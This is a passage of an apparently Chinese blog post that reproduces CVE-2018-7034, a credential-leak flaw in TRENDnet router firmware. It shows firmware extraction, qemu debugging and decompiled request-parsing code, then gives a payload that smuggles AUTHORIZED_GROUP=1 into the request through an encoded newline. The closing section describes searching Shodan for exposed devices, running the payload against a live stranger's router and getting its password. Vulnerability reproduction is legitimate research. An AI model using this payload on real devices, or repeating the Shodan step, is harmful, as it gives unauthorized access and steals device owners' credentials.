class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;password&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;password&quot;</span>).<span class="string">&quot;&lt;/password&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;group&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;group&quot;</span>).<span class="string">&quot;&lt;/group&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;description&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;description&quot;</span>).<span class="string">&quot;&lt;/description&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t&lt;/entry&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要AUTHORIZED_GROUP&#x3D;1就可以获得用户的敏感信息:密码</p><p>因为传入的数据都是先通过登录验证文件 <code>htdocs/cgibin</code> 的解析后，发送给 <code>php</code> 等文件进行处理，所以分析cgibin是如何设置该字段的，winmt师傅说由于这里的<code>webserver</code>运行的是<code>php</code>脚本，所以要着重看php部分</p><h2 id="环境的搭建"><a href="#环境的搭建" class="headerlink" title="环境的搭建"></a>环境的搭建</h2><p>固件的提取，这里使用的是TrendNet的固件TEW-715APO</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244911.png" alt="image-20240708110926473"></p><p>下载然后binwalk提取即可，但是这题搭建了系统qemu也没啥用，主要是太难以调试了，以系统模式的话，因此考虑的是<code>qemu-mipsel-static</code>用户级调试</p><h2 id="二进制文件的调用"><a href="#二进制文件的调用" class="headerlink" title="二进制文件的调用"></a>二进制文件的调用</h2><p>最终的调试指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chroot</span> . ./qemu-mipsel-static -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  -E CONTENT_LENGTH=<span class="string">&quot;26214&quot;</span> -E REQUEST_URI=<span class="string">&quot;wtf?COOL&quot;</span> -g 1234 ./phpcgi 123</span><br></pre></td></tr></table></figure><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> (*v8)(); <span class="comment">// $t9</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  v3 = *argv;</span><br><span class="line">  v6 = <span class="built_in">strrchr</span>(*argv, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    v3 = v6 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;phpcgi&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = phpcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> (v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244912.png" alt="image-20240708111833108"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244913.png" alt="image-20240708123801112"></p><p>遍历环境变量之后的结果，会发现他好像将本机的env都搞出来了</p><p>着重注意第一个设置的结构体，显然是环境变量的所在处，然后必须为post请求，这样func函数才为sub_405AC0，这个函数之后会再次出现，只需记住即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">cgibin_parse_request</span><span class="params">(<span class="type">int</span> function, sodj *addr, <span class="type">unsigned</span> <span class="type">int</span> Maxnum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *CONTENT_LENGTH_ptr; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">char</span> *CONTENT_TYPE_ptr; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">char</span> **content_type_; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">size_t</span> len_1; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// $a1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_TYPE&quot;</span>) &amp;&amp; (CONTENT_LENGTH_ptr = <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_LENGTH&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">    len = <span class="built_in">atoi</span>(CONTENT_LENGTH_ptr);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="built_in">parse_uri</span>(function, addr);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Maxnum &gt;= len )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( len )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_TYPE&quot;</span>);</span><br><span class="line">        CONTENT_TYPE_ptr = <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_TYPE&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( CONTENT_TYPE_ptr )</span><br><span class="line">        &#123;</span><br><span class="line">          content_type_ = &amp;off_433014;</span><br><span class="line">          v11 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v14 = *content_type_;</span><br><span class="line">            <span class="keyword">if</span> ( !*content_type_ )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            len_1 = content_type_[<span class="number">1</span>];</span><br><span class="line">            content_type_ += <span class="number">3</span>;</span><br><span class="line">            ++v11;</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strncasecmp</span>(CONTENT_TYPE_ptr, v14, len_1) )</span><br><span class="line">              <span class="keyword">return</span> ((&amp;off_433014)[<span class="number">3</span> * v11 - <span class="number">1</span>])(function, addr, len, &amp;CONTENT_TYPE_ptr[len_1]);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_4033E8</span>(len);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会遍历<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244914.png" alt="image-20240708112411987">这部分内容，相应的请求方式执行对应的函数</p><p>发现除了Application形式的剩下的所有的返回值都是-1，返回到主函数就直接退出了，因此仔细看sub_40445C</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_40445C</span><span class="params">(<span class="type">int</span> funct, sodj *addr, <span class="type">int</span> CONTENT_LENGTH_ptr, <span class="type">const</span> <span class="type">char</span> *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncasecmp</span>(a4, <span class="string">&quot;x-www-form-urlencoded&quot;</span>, <span class="number">0x15</span>u) )<span class="comment">// 如果是x-www-form-urlencoded形式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_403A0C</span>(funct, addr, CONTENT_LENGTH_ptr);</span><br><span class="line">  <span class="built_in">sub_4033E8</span>(CONTENT_LENGTH_ptr);</span><br><span class="line">  <span class="built_in">sub_4040E0</span>(<span class="string">&quot;read_ct_application&quot;</span>, a4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然是application&#x2F;x-www-form-urlencoded的post请求会调用sub_403A0C</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244915.png" alt="image-20240708112718662"></p><p>其中read读入的便是我们的Poc，调试的话直接输入到远程页面即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_403864</span><span class="params">(_DWORD *a1, <span class="type">int</span> data_addr, <span class="type">unsigned</span> <span class="type">int</span> more_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> thelen; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $v1</span></span><br><span class="line">  <span class="built_in">void</span> (__fastcall *func)(<span class="type">int</span>, <span class="type">int</span> *); <span class="comment">// $t9</span></span><br><span class="line">  <span class="type">int</span> export_addr; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> one; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// $a1</span></span><br><span class="line">  sodj *sodj; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *oneaddr; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v16[<span class="number">4</span>]; <span class="comment">// [sp+18h] [-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( data_addr )</span><br><span class="line">  &#123;</span><br><span class="line">    thelen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( more_len )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = thelen &lt; more_len;</span><br><span class="line">        <span class="keyword">if</span> ( thelen &gt;= more_len )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        oneaddr = (data_addr + thelen);</span><br><span class="line">        one = *(data_addr + thelen);</span><br><span class="line">        <span class="keyword">if</span> ( *a1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = *oneaddr;</span><br><span class="line">          <span class="keyword">if</span> ( one == <span class="string">&#x27;&amp;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">sub_403864</span>(a1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">          &#125;</span><br><span class="line">          sodj = a1[<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v13 = *oneaddr;</span><br><span class="line">          <span class="keyword">if</span> ( one == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *a1 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">          &#125;</span><br><span class="line">          sodj = a1[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sobj_add_char</span>(sodj, v13);               <span class="comment">// 将第一个等号前面的内容存到sodj1 等号后面的存到sodj2</span></span><br><span class="line">LABEL_15:</span><br><span class="line">        ++thelen;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">sobj_empty</span>(a1[<span class="number">1</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sobj_unescape_uri</span>(a1[<span class="number">1</span>]);                 <span class="comment">// 将%xx解码为ASCII码</span></span><br><span class="line">      <span class="built_in">sobj_unescape_uri</span>(a1[<span class="number">2</span>]);</span><br><span class="line">      v7 = a1[<span class="number">1</span>];</span><br><span class="line">      v8 = a1[<span class="number">2</span>];</span><br><span class="line">      func = a1[<span class="number">3</span>];</span><br><span class="line">      export_addr = a1[<span class="number">4</span>];</span><br><span class="line">      v16[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      v16[<span class="number">1</span>] = v7;</span><br><span class="line">      v16[<span class="number">2</span>] = v8;</span><br><span class="line">      <span class="built_in">func</span>(export_addr, v16);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sobj_free</span>(a1[<span class="number">1</span>]);</span><br><span class="line">  result = <span class="built_in">sobj_free</span>(a1[<span class="number">2</span>]);</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会发现它将&#x3D;两边的东西都分别存储到对应的地方，而之后对%xx进行了解码之后再次调用func就是之前的那个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_405AC0</span><span class="params">(sodj *glocal_addr, _DWORD *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *string; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v10; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// $a1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *addr )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *addr != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, <span class="string">&quot;_FILES_&quot;</span>);</span><br><span class="line">    string = <span class="built_in">sobj_get_string</span>(addr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, string);</span><br><span class="line">    <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">    v8 = addr[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">      v9 = <span class="built_in">sobj_get_string</span>(v8);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v9 = &amp;off_420798;</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, v9);</span><br><span class="line">    <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, <span class="string">&quot;_FILETYPES_&quot;</span>);</span><br><span class="line">    v10 = <span class="built_in">sobj_get_string</span>(addr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, v10);</span><br><span class="line">    <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="number">61</span>);</span><br><span class="line">    v6 = addr[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = &amp;off_420798;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, <span class="string">&quot;_POST_&quot;</span>);</span><br><span class="line">    v5 = <span class="built_in">sobj_get_string</span>(addr[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">sobj_add_string</span>(glocal_addr, v5);</span><br><span class="line">    <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="number">61</span>);</span><br><span class="line">    v6 = addr[<span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = <span class="built_in">sobj_get_string</span>(v6);</span><br><span class="line">LABEL_11:</span><br><span class="line">  <span class="built_in">sobj_add_string</span>(glocal_addr, v11);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sobj_add_char</span>(glocal_addr, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现就是将结构体的内容存到环境变量里</p><h2 id="POC的书写"><a href="#POC的书写" class="headerlink" title="POC的书写"></a>POC的书写</h2><p>因此我们可以构造一个Poc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SERVICES=DEVICE.ACCOUNT%<span class="number">0</span>aAUTHORIZED_GROUP=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>shodan随便找一个<a href="https://www.shodan.io/search?query=tew-751dr">shodan</a></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244916.png" alt="image-20240708113738832"></p><p>就获得了他的密码</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7034">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7034</a></p><p><a href="https://www.iotsec-zone.com/article/384">https://www.iotsec-zone.com/article/384</a></p><p><a href="https://zikh26.github.io/posts/5f982ad5.html">https://zikh26.github.io/posts/5f982ad5.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
